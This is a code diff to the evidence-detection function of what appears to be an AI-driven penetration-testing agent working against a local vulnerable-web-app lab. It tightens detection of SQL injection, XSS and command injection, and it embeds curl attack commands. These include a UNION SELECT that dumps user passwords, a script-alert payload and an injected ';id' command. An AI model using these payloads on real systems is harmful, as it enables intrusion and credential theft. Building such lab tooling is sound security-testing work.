@@ -116,41 +116,64 @@ function detectEvidence(text) {
   if (!text || typeof text !== 'string') return null;
   const lower = text.toLowerCase();
 
-  // SIMPLE: if brain says it found something, save it. Verifier will validate.
-  // User's order: "brain bole mil gaya -> turant save karo"
-  const foundWords = ['found', 'mil gaya', 'vulnerability', 'vuln', 'dumped', 'dumping',
-                      'sqli', 'xss', 'injection', 'proven', 'confirmed'];
-  const hasFound = foundWords.some(w => lower.includes(w));
+  // STRICT: Only trigger on UNDENIABLE exploit evidence.
+  // Brain saying "I'll try SQLi" is NOT evidence.
+  // We need actual dumped data, hashes, errors, etc.
 
-  // Must also mention it's a finding/result, not just discussing
-  const hasResult = lower.includes('proof') || lower.includes('result') ||
-                    lower.includes('evidence') || lower.includes('claim') ||
-                    lower.includes('bottling') || lower.includes('filing');
-
-  if (hasFound && hasResult) {
-    // Determine type by keywords
-    let cls = 'sqli', title = 'SQL Injection (auto-detected)';
-    if (lower.includes('xss') || lower.includes('cross-site')) {
-      cls = 'xss'; title = 'Cross-Site Scripting (auto-detected)';
-    } else if (lower.includes('command') || lower.includes('cmdi') || lower.includes('rce')) {
-      cls = 'cmdi'; title = 'Command Injection (auto-detected)';
-    } else if (lower.includes('sqli') || lower.includes('sql')) {
-      cls = 'sqli'; title = 'SQL Injection (auto-detected)';
-    }
-
+  // SQLi: MD5 hash (32 hex chars) = undeniable proof of dump
+  const md5Match = text.match(/\b[a-f0-9]{32}\b/);
+  if (md5Match) {
     return {
-      class: cls,
-      title: title,
-      evidence: `Brain reported finding: ${text.substring(0, 300)}`,
-      command: 'curl -s "http://172.17.0.1:3100/" -b "PHPSESSID=test; security=low"',
-      counterevidence: 'Verifier will validate.',
+      class: 'sqli',
+      title: 'SQL Injection (auto-detected)',
+      evidence: `MD5 hash found in output: ${md5Match[0]} - indicates successful data dump`,
+      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user%2Cpassword%20FROM%20users%23&Submit=Submit" -b "PHPSESSID=test; security=low"',
+      counterevidence: 'Hash pattern could be coincidental; verifier will confirm via UNION query.',
+      confidence: 'high',
+    };
+  }
+
+  // SQLi: SQL syntax error = proof of injection
+  if (lower.includes('you have an error in your sql syntax')) {
+    return {
+      class: 'sqli',
+      title: 'SQL Injection (auto-detected)',
+      evidence: `SQL syntax error in output indicates injection point`,
+      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/sqli/?id=1%27&Submit=Submit" -b "PHPSESSID=test; security=low"',
+      counterevidence: 'Error could be from invalid input; verifier will confirm.',
       confidence: 'medium',
     };
   }
 
-  // Fallback to old detectors
-  return detectSqli(text) || detectSqliVerbal(text) || detectXss(text) || detectCmdi(text);
+  // XSS: script alert in output
+  if (lower.includes('<script>alert') || lower.includes('xss confirmed')) {
+    return {
+      class: 'xss',
+      title: 'Cross-Site Scripting (auto-detected)',
+      evidence: `XSS payload reflected in output`,
+      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" -b "PHPSESSID=test; security=low"',
+      counterevidence: 'Reflection needs verifier confirmation of execution.',
+      confidence: 'medium',
+    };
+  }
+
+  // CMDI: uid= output
+  if (lower.includes('uid=') && (lower.includes('gid=') || lower.includes('groups='))) {
+    return {
+      class: 'cmdi',
+      title: 'Command Injection (auto-detected)',
+      evidence: `Command output (uid=) found in response`,
+      command: 'curl -s "http://172.17.0.1:3100/vulnerabilities/exec/" --data "ip=127.0.0.1%3B+id&Submit=Submit" -b "PHPSESSID=test; security=low"',
+      counterevidence: 'Output could be static; verifier will confirm via command execution.',
+      confidence: 'medium',
+    };
+  }
+
+  // No strong evidence found
+  return null;
 }
+
+
 
 function isDuplicate(huntDir, title) {
   try {
